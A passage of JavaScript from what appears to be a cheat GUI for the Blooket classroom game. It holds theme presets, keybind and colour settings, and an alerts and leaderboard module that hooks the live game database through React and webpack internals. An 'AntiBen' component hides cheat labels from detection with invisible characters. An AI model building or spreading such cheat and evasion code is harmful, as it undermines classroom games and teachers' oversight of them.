                                    },
                                    {
                                        name: "Saint Patricks Background",
                                        value: {
                                            backgroundColor: "rgb(9, 148, 65)"
                                        }
                                    },
                                    {
                                        name: "Halloween Background",
                                        value: {
                                            backgroundColor: "rgb(41, 41, 41)"
                                        }
                                    },
                                    {
                                        name: "Fall Background",
                                        value: {
                                            backgroundColor: "rgb(224, 159, 62)"
                                        }
                                    },
                                    {
                                        name: "Winter Background",
                                        value: {
                                            backgroundColor: "linear-gradient(rgb(49, 170, 224), rgb(187, 221, 255))"
                                        }
                                    },
                                    {
                                        name: "Crypto Hack",
                                        value: {
                                            backgroundColor: "radial-gradient(#11581e,#041607)",
                                            infoColor: "#1a1a1a",
                                            cheatList: "#1a1a1a",
                                            defaultButton: "rgb(88 175 88)",
                                            disabledButton: "#A02626",
                                            enabledButton: "#0b601b",
                                            textColor: "white",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            contentBackground: "#11581e"
                                        }
                                    },
                                    {
                                        name: "Fishing Frenzy",
                                        value: {
                                            backgroundColor: "linear-gradient(180deg,#9be2fe 0,#67d1fb)",
                                            infoColor: "#c8591e",
                                            cheatList: "#c8591e",
                                            defaultButton: "#ff751a",
                                            disabledButton: "#bf0e0e",
                                            enabledButton: "#2fb62f",
                                            textColor: "white",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            contentBackground: "radial-gradient(#02b0ea 40%, #1d86ea)"
                                        }
                                    },
                                    {
                                        name: "Deceptive Dinos",
                                        value: {
                                            backgroundColor: "radial-gradient(rgba(220, 184, 86, 0), rgba(220, 184, 86, 0.4)), url(\"https://ac.blooket.com/play/111cb7e0ee6607ac3d1a13d534c0e0f1.png\"), #ead49a",
                                            infoColor: "#af8942",
                                            cheatList: "#af8942",
                                            defaultButton: "#af8942",
                                            disabledButton: "#A02626",
                                            enabledButton: "#47A547",
                                            textColor: "white",
                                            inputColor: "rgb(0 0 0 / 10%)",
                                            contentBackground: "radial-gradient(rgba(1,104,162,.6),rgba(24,55,110,.5)),radial-gradient(#2783b4 1.5px,#18376e 0) center / 24px 24px"
                                        }
                                    },
                                    {
                                        name: "Blook Rush",
                                        value: {
                                            backgroundColor: "repeating-linear-gradient(45deg,white,white 8%,#e6e6e6 0,#e6e6e6 16%)",
                                            defaultButton: "#36c",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            infoColor: "#36c",
                                            cheatList: "#36c",
                                            contentBackground: "#888",
                                            textColor: "white",
                                            disabledButton: "#A02626",
                                            enabledButton: "#47A547"
                                        }
                                    },
                                    {
                                        name: "Factory",
                                        value: {
                                            defaultButton: "#1563bf",
                                            infoColor: "#a5aabe",
                                            cheatList: "#a5aabe",
                                            contentBackground: "#2d313d",
                                            backgroundColor: "#3a3a3a",
                                            enabledButton: "rgb(75, 194, 46)",
                                            disabledButton: "#9a49aa",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            textColor: "white"
                                        }
                                    },
                                    {
                                        name: "Cafe",
                                        value: {
                                            backgroundColor: "linear-gradient(90deg,rgba(200,0,0,.5) 50%,transparent 0) center / 50px 50px,linear-gradient(rgba(200,0,0,0.5) 50%,transparent 0) white center / 50px 50px",
                                            defaultButton: "#0bc2cf",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            infoColor: "#ac7339",
                                            cheatList: "#ac7339",
                                            contentBackground: "rgb(64, 64, 64)",
                                            textColor: "white",
                                            disabledButton: "#A02626",
                                            enabledButton: "#47A547"
                                        }
                                    },
                                    {
                                        name: "Tower of Doom",
                                        value: {
                                            backgroundColor: "rgb(41 41 41)",
                                            disabledButton: "rgb(151, 15, 5)",
                                            defaultButton: "#333",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            contentBackground: "#404040",
                                            enabledButton: "#4bc22e",
                                            textColor: "white",
                                            infoColor: "#9a49aa",
                                            cheatList: "#9a49aa"
                                        }
                                    },
                                    {
                                        name: "Monster Brawl",
                                        value: {
                                            defaultButton: "rgb(45, 51, 67)",
                                            backgroundColor: "rgb(78, 95, 124)",
                                            inputColor: "rgb(0 0 0 / 25%)",
                                            contentBackground: "linear-gradient(0deg,#374154,#4f5b74)",
                                            infoColor: "#374154",
                                            cheatList: "#374154",
                                            textColor: "white",
                                            enabledButton: "#47A547",
                                            disabledButton: "#A02626"
                                        }
                                    },
                                    {
                                        name: "Tower Defense 2",
                                        value: {
                                            backgroundColor: "url(https://media.blooket.com/image/upload/v1676164454/Media/defense/backgroundTd1-02.svg) center / cover",
                                            cheatList: "#a33c22",
                                            infoColor: "#a33c22",
                                            defaultButton: "#40b1d8",
                                            inputColor: "#3e8cbe",
                                            contentBackground: "#293c82",
                                            enabledButton: "#47A547",
                                            disabledButton: "#A02626",
                                            textColor: "white"
                                        }
                                    },
                                ]
                            }
                        ],
                        run: function (theme) {
                            settings.setItem("theme", { ...settings.data.theme, ...theme });
                        }
                    },
                    {
                        name: "Scale",
                        description: "Forces the GUI to scale from 25%-100%",
                        inputs: [
                            {
                                type: "number",
                                name: "Percent scale",
                                min: 25,
                                max: 100,
                                value: (settings.data?.scale || 1) * 100
                            }
                        ],
                        run: function (scale) {
                            scale = Math.min(Math.max(scale, 25), 100);
                            settings.setItem("scale", scale / 100);
                            guiWrapper.style.transform = `scale(${(scale / 100)})`;
                        }
                    },
                    {
                        name: "Hide Keybind",
                        description: "Change the hide keybind (Click button after input to change)",
                        inputs: [
                            {
                                type: "function",
                                name: "Input",
                                function: onchange => createKeybindListener(({ shift, ctrl, alt, key }) => onchange(`${[ctrl && "Ctrl", shift && "Shift", alt && "Alt", key && key.toUpperCase()].filter(Boolean).join(' + ')}`))
                            }
                        ],
                        run: function (hide) {
                            settings.setItem("hide", hide);
                        }
                    },
                    {
                        name: "Close Keybind",
                        description: "Change the quick close keybind (Click button after input to change)",
                        inputs: [
                            {
                                type: "function",
                                name: "Input",
                                function: onchange => createKeybindListener(({ shift, ctrl, alt, key }) => onchange(`${[ctrl && "Ctrl", shift && "Shift", alt && "Alt", key && key.toUpperCase()].filter(Boolean).join(' + ')}`))
                            }
                        ],
                        run: function (close) {
                            settings.setItem("close", close);
                        }
                    },
                    {
                        name: "Background Color",
                        description: "Changes the background color of the GUI",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.backgroundColor", color);
                        }
                    },
                    {
                        name: "Category List Color",
                        description: "Changes the categories list background color",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.cheatList", color);
                        }
                    },
                    {
                        name: "Info Color",
                        description: "Changes the color of the information at the top of the GUI",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.infoColor", color);
                        }
                    },
                    {
                        name: "Button Color",
                        description: "Changes the color of the cheats",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.defaultButton", color);
                        }
                    },
                    {
                        name: "Enabled Toggle Color",
                        description: "Changes the color of enabled toggle cheats",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.enabledButton", color);
                        }
                    },
                    {
                        name: "Disabled Toggle Color",
                        description: "Changes the color of disabled toggle cheats",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.disabledButton", color);
                        }
                    },
                    {
                        name: "Text Color",
                        description: "Changes the text color",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.textColor", color);
                        }
                    },
                    {
                        name: "Input Color",
                        description: "Changes the color of inputs, like the set gold number input",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.inputColor", color);
                        }
                    },
                    {
                        name: "Content Color",
                        description: "Changes the background color of the cheats",
                        inputs: [{
                            type: "string",
                            name: "Color"
                        }],
                        run: function (color) {
                            settings.setItem("theme.contentBackground", color);
                        }
                    }
                ]
            },
            alerts: {
                name: "Alerts",
                img: null,
                alerts: [{ message: "[LOG] GUI opened" }],
                diffObjects(obj1, obj2) {
                    const changed = {};
        
                    for (const key in obj1) {
                        if (!(key in obj2)) continue;
                        if (typeof obj1[key] === "object" && typeof obj2[key] === "object") {
                            const recChanged = Cheats.alerts.diffObjects(obj1[key], obj2[key]);
                            if (recChanged && Object.keys(recChanged).length !== 0) changed[key] = recChanged;
                        } else if (JSON.stringify(obj1[key]) !== JSON.stringify(obj2[key])) changed[key] = obj2[key];
                    }
        
                    for (const key in obj2) if (!(key in obj1)) changed[key] = obj2[key];
        
                    if (Object.keys(changed).length == 0) return null;
                    return changed;
                },
                addLog(message, color) {
                    if (!Cheats.alerts.visible) Cheats.alerts.alerts.push({ message, color });
                    else Cheats.alerts.setAlerts(a => [...a, { message, color }]);
                },
                addAlert(name, blook, message) {
                    let alert = {
                        message: React.createElement(React.Fragment, null, React.createElement("img", {
                            src: blook || Cheats.alerts.blookData?.Black?.url,
                            alt: "Blook",
                            style: {
                                height: "22.5px",
                                margin: "0 10px -5px 0"
                            }
                        }), React.createElement("strong", null, name), " ", message)
                    }
                    if (!Cheats.alerts.visible) Cheats.alerts.alerts.push(alert);
                    else Cheats.alerts.setAlerts(a => [...a, alert]);
                },
                getGamemode() {
                    switch (window.location.pathname) {
                        case "/play/racing":
                            return "racing";
                        case "/play/factory":
                            return "factory";
                        case "/play/classic/get-ready":
                        case "/play/classic/question":
                        case "/play/classic/answer/sent":
                        case "/play/classic/answer/result":
                        case "/play/classic/standings":
                            return "classic";
                        case "/play/battle-royale/match/preview":
                        case "/play/battle-royale/question":
                        case "/play/battle-royale/answer/sent":
                        case "/play/battle-royale/answer/result":
                        case "/play/battle-royale/match/result":
                            return "royale";
                        case "/play/toy":
                            return "workshop";
                        case "/play/gold":
                            return "gold";
                        case "/play/brawl":
                            return "brawl";
                        case "/play/hack":
                            return "hack";
                        case "/play/fishing":
                            return "fishing";
                        case "/play/rush":
                            return "rush";
                        case "/play/dino":
                            return "dino";
                        case "/tower/map":
                        case "/tower/battle":
                        case "/tower/rest":
                        case "/tower/risk":
                        case "/tower/shop":
                        case "/tower/victory":
                            return "doom";
                        case "/cafe":
                        case "/cafe/shop":
                            return "cafe";
                        case "/defense":
                            return "defense";
                        case "/play/defense2":
                            return "defense2";
                        case "/kingdom":
                            return "kingdom";
                        default:
                            return false;
                    }
                },
                connection: null,
                data: {},
                async connect() {
                    try {
                        const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                        if (!stateNode?.props?.liveGameController?._liveGameCode) return false;
                        Cheats.alerts.connection = await stateNode.props.liveGameController.getDatabaseRef("c");
                        const blooks = Cheats.alerts.blookData;
                        const gamemode = Cheats.alerts.getGamemode();
                        const factoryGlitches = Object.values(webpack.c).find(x => x.exports.a?.["Lunch Break"]).exports.b;
                        Cheats.alerts.connection.on("value", snapshot => {
                            const players = snapshot.val() || {};
                            if (!players || !Cheats.alerts.diffObjects(Cheats.alerts.data, players)) return;
                            const added = Cheats.alerts.diffObjects(Cheats.alerts.data, players)
                            Cheats.alerts.data = players;
                            let standings;
                            switch (gamemode) {
                                case "racing":
                                    standings = Object.entries(players).map(([name, { b, pr }]) => ({ name, blook: b, value: pr || 0 }));
                                case "classic":
                                    standings = Object.entries(players).map(([name, { b, p }]) => ({ name, blook: b, value: p || 0 }));
                                case "royale":
                                    standings = Object.entries(players).map(([name, { b, e }]) => ({ name, blook: b, value: e || 0 }));
                                case "workshop":
                                    standings = Object.entries(players).map(([name, { b, t }]) => ({ name, blook: b, value: t || 0 }));
                                case "brawl":
                                    standings = Object.entries(players).map(([name, { b, xp }]) => ({ name, blook: b, value: xp || 0 }));
                                case "defense":
                                case "defense2":
                                    standings = Object.entries(players).map(([name, { b, d }]) => ({ name, blook: b, value: d || 0 }));
                                case "gold":
                                    for (const player in added) {
                                        if (!added[player].tat) continue;
                                        const [tat, amount] = added[player].tat.split(':');
                                        if (amount == "swap") Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `just swapped with ${tat}`);
                                        else Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `just took ${Cheats.alerts.formatNumber(parseInt(amount))} gold from ${tat}`);
                                    }
                                    standings = Object.entries(players).map(([name, { b, g }]) => ({ name, blook: b, value: g || 0 }));
                                    break;
                                case "hack":
                                    for (const player in added) {
                                        if (!added[player].tat) continue;
                                        const [tat, amount] = added[player].tat.split(':');
                                        Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `just took ${Cheats.alerts.formatNumber(parseInt(amount))} crypto from ${tat}`);
                                    }
                                    standings = Object.entries(players).map(([name, { b, cr }]) => ({ name, blook: b, value: cr || 0 }));
                                    break;
                                case "fishing":
                                    for (const player in added) {
                                        if (added[player].f == "Frenzy") Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `just started a frenzy`);
                                        else if (added[player].s) Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `just sent a ${added[player].f} distraction`);
                                    }
                                    standings = Object.entries(players).map(([name, { b, w }]) => ({ name, blook: b, value: w || 0 }));
                                    break;
                                case "dino":
                                    for (const player in added) {
                                        if (!added[player].tat) continue;
                                        const [tat, caught] = added[player].tat.split(':');
                                        if (caught == "true") Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `just caught ${tat} CHEATING!`);
                                        else Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `investigated ${tat}`);
                                    }
                                    standings = Object.entries(players).map(([name, { b, f }]) => ({ name, blook: b, value: f || 0 }));
                                    break;
                                case "cafe":
                                    for (const player in added) {
                                        if (!added[player].up) continue;
                                        const [upgrade, level] = added[player].up.split(":");
                                        if (level) Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `upgraded ${upgrade} to level ${level}`);
                                    }
                                    standings = Object.entries(players).map(([name, { b, ca }]) => ({ name, blook: b, value: ca || 0 }));
                                    break;
                                case "factory":
                                    for (const player in added) {
                                        const data = added[player];
                                        if (data.g) Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `activated the ${factoryGlitches[data.g]} glitch!`);
                                        else if (data.s) {
                                            const [amount, synergy] = data.s.split('-');
                                            Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `has a ${amount} ${synergy} synergy!`);
                                        } else if (data.t) Cheats.alerts.addAlert(player, blooks[players[player].b]?.url, `now has 10 Blooks!`);
                                    }
                                    standings = Object.entries(players).map(([name, { b, ca }]) => ({ name, blook: b, value: ca || 0 }));
                                    break;
                            }
                            Cheats.alerts.standings = standings.sort((a, b) => b.value - a.value)
                            Cheats.alerts.setLeaderboard(Cheats.alerts.standings);
                        });
                        return true;
                    } catch {
                        return false;
                    }
                },
                cheats: [
                    {
                        element: createElement(function Alerts() {
                            const [alerts, setAlerts] = useState([]);
                            const [leaderboard, setLeaderboard] = useState([]);
                            Cheats.alerts.setAlerts = setAlerts;
                            Cheats.alerts.setLeaderboard = setLeaderboard;
                            useEffect(() => {
                                Cheats.alerts.blookData = Object.values(webpack.c).find(x => x.exports.a?.Black).exports.a;
                                Cheats.alerts.formatNumber = Object.values(webpack("74sb")).find(x => String(x).includes("×") || String(x).includes("toPrecision"));
                                Cheats.alerts.standings && setLeaderboard(Cheats.alerts.standings);
                                setAlerts(Cheats.alerts.alerts);
                                Cheats.alerts.visible = true;
                                window.Cheats = Cheats;
                                return () => Cheats.alerts.visible = false;
                            }, []);
                            useEffect(() => {
                                Cheats.alerts.alerts = alerts;
                            }, [alerts])
                            return React.createElement("div", {
                                className: styles.keys.alertContainer
                            }, React.createElement("ul", {
                                className: styles.keys.alertList,
                                style: {
                                    margin: "10px 10px 0 10px",
                                    padding: "0",
                                    listStyleType: "none",
                                    display: "flex",
                                    flexDirection: "column-reverse",
                                    height: "355px",
                                    overflowY: "scroll",
                                    wordWrap: "break-word"
                                }
                            }, alerts.slice().reverse().map((alert, i) => React.createElement("li", {
                                style: {
                                    margin: "5px"
                                },
                                key: i
                            }, React.createElement("span", {
                                style: {
                                    color: alert.color || "var(--textColor)"
                                }
                            }, alert.message)))), leaderboard.length > 0 && React.createElement("div", {
                                style: {
                                    position: "absolute",
                                    inset: "110% 0px"
                                }
                            }, React.createElement("div", {
                                style: {
                                    alignItems: "center",
                                    boxSizing: "border-box",
                                    display: "flex",
                                    flexDirection: "row",
                                    flexWrap: "wrap",
                                    justifyContent: "space-evenly",
                                    padding: "20px 5px 20px",
                                    position: "relative",
                                    width: "100%",
                                    fontFamily: "Nunito, sans-serif",
                                    fontWeight: "400",
                                    color: "var(--textColor)",
                                    background: "var(--contentBackground)",
                                    boxShadow: "inset 0 -6px rgb(0 0 0 / 20%)",
                                    borderRadius: "7px"
                                }
                            }, React.createElement("div", {
                                className: styles.keys.headerText
                            }, React.createElement("div", {
                                style: {
                                    alignItems: "center",
                                    boxSizing: "border-box",
                                    display: "flex",
                                    height: "100%",
                                    justifyContent: "center",
                                    padding: "0 15px",
                                    width: "100%",
                                    fontFamily: "Titan One, sans-serif",
                                    fontSize: "26px",
                                    fontWeight: "400",
                                    textShadow: "-1px -1px 0 #646464, 1px -1px 0 #646464, -1px 1px 0 #646464, 2px 2px 0 #646464",
                                    color: "white",
                                    background: "linear-gradient(#fcd843,#fcd843 50%,#feb31a 50.01%,#feb31a)",
                                    borderRadius: "5px"
                                }
                            }, "Leaderboard")), React.createElement("div", {
                                className: styles.keys.alertContainer,
                                style: {
                                    margin: "15px 15px 5px 15px",
                                    backgroundColor: "rgb(0 0 0 / 50%)",
                                    width: "95%",
                                    height: "370px",
                                    borderRadius: "7px",
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center"
                                }
                            }, React.createElement("nl", {
                                className: styles.keys.alertList,
                                style: {
                                    marginTop: "10px",
                                    padding: "0",
                                    listStyleType: "decimal",
                                    width: "100%",
                                    height: "355px",
                                    overflowY: "scroll",
                                    wordWrap: "break-word"
                                }
                            }, leaderboard.map(({ blook, name, value }) => React.createElement("li", {
                                style: {
                                    fontSize: "2rem",
                                    paddingInline: "72px 15px",
                                    paddingBlock: "1.25px",
                                    position: "relative"
                                },
                                key: name
                            }, React.createElement("img", {
                                src: Cheats.alerts.blookData[blook]?.url || Cheats.alerts.blookData.Black.url,
                                alt: blook,
                                style: {
                                    height: "45px",
                                    position: "absolute",
                                    left: "15px"
                                }
                            }), name, React.createElement("span", {
                                style: {
                                    float: "right"
                                }
                            }, Cheats.alerts.formatNumber(parseInt(value))))))))));
                        }, null)
                    }
                ]
            }
        }
        const GUIContainer = document.createElement("div");
        function createKeybindListener(onpress, element = window) {
            return new Promise(resolve => {
                const pressed = {};
                let shift, ctrl, alt, key;
                const keydown = e => {
                    e.preventDefault();
                    pressed[e.code] = true;
                    shift ||= e.shiftKey;
                    ctrl ||= e.ctrlKey;
                    alt ||= e.altKey;
                    if (!["shift", "control", "alt", "meta"].includes(e.key.toLowerCase())) key = e.key.toLowerCase();
                    onpress?.({ shift, ctrl, alt, key });
                };
                const keyup = e => {
                    delete pressed[e.code];
                    if (Object.keys(pressed).length > 0) return;
                    element.removeEventListener("keydown", keydown);
                    element.removeEventListener("keyup", keyup);
                    resolve({ shift, ctrl, alt, key });
                };
                element.addEventListener("keydown", keydown);
                element.addEventListener("keyup", keyup);
            });
        }
        function AntiBen({ type = "div", children, ...props }) {
            let childs = [];
            let char = (space) => React.createElement("span", {
                style: {
                    display: "inline-block",
                    opacity: "0",
                    width: "0",
                    height: "0",
                    lineHeight: "0",
                    userSelect: "none",
                    marginLeft: space ? "5px" : null
                }
            }, String.fromCharCode(Math.floor(Math.random() * 25) + 97))
            const addChar = (child) => {
                if (typeof child == "string") {
                    let text = [];
                    for (let i = 0; i < child.length; i += 3) text.push(child.slice(i, i + 3), char());
                    childs.push(...text);
                }
                else childs.push(child, char());
            }
            if (Array.isArray(children)) for (let i = 0; i < children.length; i++) addChar(children[i]);
            else addChar(children);
            return React.createElement(type, props, React.createElement("span", null, childs));
        }
        function ScriptInput({ input, onValue, run }) {
            const { name, type, options: opts, min, max, value } = input;
            let optState;
            try {
                optState = typeof opts == "function" ? opts() : opts;
            } catch (e) {
                console.warn(e);
                optState = [];
            }
            const [options, setOptions] = useState(optState)
            const [locked, setLocked] = useState("");
            const loading = useRef(true);
            useEffect(() => {
                if (options instanceof Promise) options.then((o) => {
                    setOptions(o);
                    onValue(o[0]?.value || o[0]);
                    input.selected = o[0]?.name || o[0];
                    loading.current = false;
                }).catch(() => setOptions([]));
                else if (options?.length) {
                    onValue(options[0]?.value || options[0]);
                    input.selected = options[0]?.name || options[0];
                }
                if (type == "number") onValue(value || (min == null ? 0 : min));
                else if (type == "function") onValue(null);
                else if (!(options instanceof Promise) && !options?.length) onValue("");
            }, []);
            let el;
            if (type == "options" && options?.length) el = React.createElement("select", {
                onChange: e => (input.selected = e.target.children[e.target.selectedIndex].innerText, onValue(JSON.parse(e.target.value)))
            }, options.map(opt => React.createElement("option", { value: JSON.stringify(opt?.value || opt) }, opt?.name || opt)));
            else if (type == "function") el = React.createElement("input", {
                className: styles.keys.cheatInput,
                placeholder: name,
                style: {
                    textAlign: "center"
                },
                readOnly: true,
                value: locked || input.data,
                onClick: async () => {
                    if (locked) return;
                    setLocked("Waiting for input...");
                    let value;
                    const data = await input.function(e => setLocked((value = e) + "..."));
                    input.data = value;
                    setLocked(false);
                    onValue(data);
                }
            });
            else {
                let isNumber = type == "number";
                el = React.createElement("input", {
                    onChange: e => onValue(isNumber ? parseInt(e.target.value) : e.target.value),
                    className: styles.keys.cheatInput,
                    type: isNumber ? "number" : null,
                    min: isNumber ? min : null,
                    max: isNumber ? max : null,
                    defaultValue: isNumber ? value || (min == null ? 0 : min) : null,
                    placeholder: name,
                    style: {
                        textAlign: "center"
                    },
                    onKeyUp: e => e.key == "Enter" && run()
                });
            }
            return el;
        }
        function ScriptButton({ script }) {
            const args = useRef([]);
            const [enabled, setEnabled] = useState(script.enabled);
            const run = useCallback(() => {
                script.run.apply(script, args.current);
                setEnabled(script.enabled);
                Cheats.alerts.addLog(React.createElement(React.Fragment, null, script.type == "toggle" ? script.enabled ? "Enabled" : "Disabled" : "Ran", " ", React.createElement("strong", null, script.name), args.current.length > 0 && ` with inputs: (${args.current.map((x, i) => JSON.stringify(script.inputs[i].selected || x)).join(", ")})`), script.type == "toggle" && (script.enabled ? "var(--enabledButton)" : "var(--disabledButton)"));
            }, []);
            return React.createElement("div", {
                style: {
                    background: script.type == "toggle" ? enabled ? "var(--enabledButton)" : "var(--disabledButton)" : "var(--defaultButton)"
                },
                key: script.name,
                "data-tip": script.description,
                className: styles.keys.scriptButton,
                onClick: e => (e.target.matches(`.${styles.keys.scriptButton}`) || e.target.matches(`.${styles.keys.cheatName}`) || e.target.matches(`.${styles.keys.cheatName} *`)) && run()
            }, React.createElement(AntiBen, {
                className: styles.keys.cheatName
            }, script.name), script.inputs?.length && script.inputs.map((input, i) => input.element || React.createElement(ScriptInput, {
                onValue: val => args.current[i] = val,
                key: i,
                input: input,
                run: run
            })));
        }
        function useSettings(settingsKey) {
            const [data, updateData] = useState(JSON.parse(localStorage.getItem(settingsKey) || "{}"));
            const setItem = useCallback((k, v) => {
                k.split('.').reduce((obj, k, i, a) => (++i == a.length && (obj[k] = v), obj[k]), data);
                localStorage.setItem(settingsKey, JSON.stringify(data));
                updateData({ ...data });
                return data;
            }, [data]);
            const deleteItem = useCallback((k, v) => {
                k.split('.').reduce((obj, k, i, a) => (++i == a.length && (delete obj[k]), obj[k]), data);
                localStorage.setItem(settingsKey, JSON.stringify(data));
                updateData({ ...data });
                return data;
            }, [data]);
            const setData = useCallback((v) => {
                updateData(v);
                localStorage.setItem(settingsKey, JSON.stringify(v));
            }, []);
            useEffect(() => {
                try {
                    updateData(JSON.parse(localStorage.getItem(settingsKey) || "{}"));
                    for (const setting of ["backgroundColor", "cheatList", "contentBackground", "defaultButton", "disabledButton", "enabledButton", "infoColor", "inputColor", "textColor"]) if (settings.data[setting]) {
                        setItem(`theme.${setting}`, settings.data[setting]);
                        deleteItem(setting);
                    }
                } catch {
                    setData({});
                }
            }, [])
            return { data, setItem, deleteItem, setData };
        }
        function Draggable({ parent, children, setPos, ...props }) {
            const mouseDown = useRef(false);
            const pos = useRef({ x: 0, y: 0 });
            useEffect(() => {
                const pointerup = () => mouseDown.current = false;
                const pointermove = (e) => {
                    if (!mouseDown.current) return;
                    let dx = pos.current.x - e.clientX;
                    let dy = pos.current.y - e.clientY;
                    pos.current = { x: e.clientX, y: e.clientY };
                    var ratio = 1 || parseFloat((0.75 / window.devicePixelRatio).toFixed(2));
                    setPos({ x: parent.offsetLeft - dx / ratio, y: parent.offsetTop - dy / ratio });
                }
                document.addEventListener("pointerup", pointerup);
                document.addEventListener("pointermove", pointermove);
                return () => {
                    document.removeEventListener("pointerup", pointerup);
                    document.removeEventListener("pointermove", pointermove);
                }
            }, [parent]);
            return React.createElement("div", {
                ...props, onPointerDown: e => {
                    mouseDown.current = true;
                    pos.current = {
                        x: e.clientX,
                        y: e.clientY
                    };
                }
            }, children);
        }
        function GUI() {
            const { current: pos } = useRef({
                x: Math.max(10, window.innerWidth - 1000) / 2,
                y: Math.max(10, window.innerHeight - 600) / 2,
            });
            const setPos = useCallback(({ x, y }) => {
                pos.x = x;
                pos.y = y;
                guiRef.current.style.left = `${x}px`;
                guiRef.current.style.top = `${y}px`;
            }, []);
            const [minified, setMinified] = useState(null);
            const [hidden, setHidden] = useState(false);
            const [currentMode, setCurrentMode] = useState("global");
            const guiRef = useRef();
            const alertInterval = useRef();
            settings = useSettings("JODGUISETTINGS");
            const variables = React.createElement("style", null, `:root {--backgroundColor: ${settings.data?.theme?.backgroundColor || "rgb(11, 194, 207)"};--infoColor: ${settings.data?.theme?.infoColor || "#9a49aa"};--cheatList: ${settings.data?.theme?.cheatList || "#9a49aa"};--defaultButton: ${settings.data?.theme?.defaultButton || "#9a49aa"};--disabledButton: ${settings.data?.theme?.disabledButton || "#A02626"};--enabledButton: ${settings.data?.theme?.enabledButton || "#47A547"};--textColor: ${settings.data?.theme?.textColor || "white"};--inputColor: ${settings.data?.theme?.inputColor || "#7a039d"};--contentBackground: ${settings.data?.theme?.contentBackground || "rgb(64, 17, 95)"};}`);
            const { current: gamemodes } = useRef(["alerts", "global", "gold", "cafe", "crypto", "dinos", "defense", "defense2", "factory", "fishing", "flappy", "doom", "kingdom", "racing", "royale", "rush", "brawl", "workshop", "settings"]);
        
            const close = useCallback(() => {
                ReactDOM.unmountComponentAtNode(GUIContainer);
                GUIContainer.remove();
            }, []);
        
            useEffect(() => { Tooltip.rebuild() });
            useEffect(() => {
                window.dispatchEvent(new Event("resize"));
                let keydown = e => {
                    let hideKey = settings.data.hide || { ctrl: true, key: "e" };
                    let closeKey = settings.data.close || { ctrl: true, key: "x" };
                    if ((hideKey.ctrl && e.ctrlKey || !hideKey.ctrl && !e.ctrlKey) && (hideKey.shift && e.shiftKey || !hideKey.shift && !e.shiftKey) && (hideKey.alt && e.altKey || !hideKey.alt && !e.altKey) && e.key.toLowerCase() == hideKey.key) {
                        e.preventDefault();
                        setHidden(h => !h);
                    } else if ((closeKey.ctrl && e.ctrlKey || !closeKey.ctrl && !e.ctrlKey) && (closeKey.shift && e.shiftKey || !closeKey.shift && !e.shiftKey) && (closeKey.alt && e.altKey || !closeKey.alt && !e.altKey) && e.key.toLowerCase() == closeKey.key) {
                        e.preventDefault();
                        close();
                    }
                };
                window.addEventListener("keydown", keydown);
                alertInterval.current = setInterval(async () => {
                    if (await Cheats.alerts.connect()) clearInterval(alertInterval.current);
                }, 5000);
                return () => {
                    window.removeEventListener("keydown", keydown);
                    clearInterval(alertInterval.current);
                    for (const gamemode of gamemodes) for (const cheat of Cheats[gamemode].cheats) if (cheat.enabled) cheat.run();
                }
            }, []);
            useEffect(() => {
                if (minified == null) return () => { };
                let gui = guiRef.current.querySelector("div");
                gui.style.height = !minified ? "100%" : "55px";
                gui.style.width = !minified ? "100%" : "165px";
                guiRef.current.style.top = `${parseInt(guiRef.current.style.top) + (guiRef.current.offsetHeight - 55) * (!minified ? -1 : 1)}px`;
                guiRef.current.style.left = `${parseInt(guiRef.current.style.left) + (guiRef.current.offsetWidth - 165) * (!minified ? -1 : 1)}px`;
                guiRef.current.style.pointerEvents = !minified ? "unset" : "none";
            }, [minified])
        
            return React.createElement("div", {
                ref: guiRef,
                id: styles.keys.guiWrapper,
                style: {
                    top: `${pos.y}px`,
                    left: `${pos.x}px`,
                    transform: `scale(${settings.data.scale || 1})`,
                    display: hidden ? "none" : null
                }
            }, React.createElement("style", null, styles.css), variables, React.createElement("div", {
                id: styles.keys.gui
            }, React.createElement("div", {
                id: styles.keys.controlButtons
            }, React.createElement(Draggable, {
                parent: guiRef.current,
                setPos: setPos,
                style: {
                    backgroundColor: "rgb(0, 160, 255)"
                },
                className: styles.keys.dragButton
            }, React.createElement("i", {
                className: "fas fa-arrows-alt"
            })), React.createElement("div", {
                style: {
                    fontWeight: "bolder",
                    backgroundColor: "grey",
                    cursor: "pointer"
                },
                onClick: () => setMinified(m => !m)
            }, React.createElement("i", {
                className: "fas fa-minus"
            })), React.createElement("div", {
                style: {
                    fontWeight: "bolder",
                    backgroundColor: "red",
                    cursor: "pointer"
                },
                onClick: close
            }, React.createElement("i", {
                className: "fas fa-times"
            }))), !minified && React.createElement(React.Fragment, null, React.createElement("div", {
                id: styles.keys.background
            }, React.createElement("div", {
                id: styles.keys.backgroundImage
            })), React.createElement(Draggable, {
                parent: guiRef.current,
                setPos: setPos,
                id: styles.keys.controls
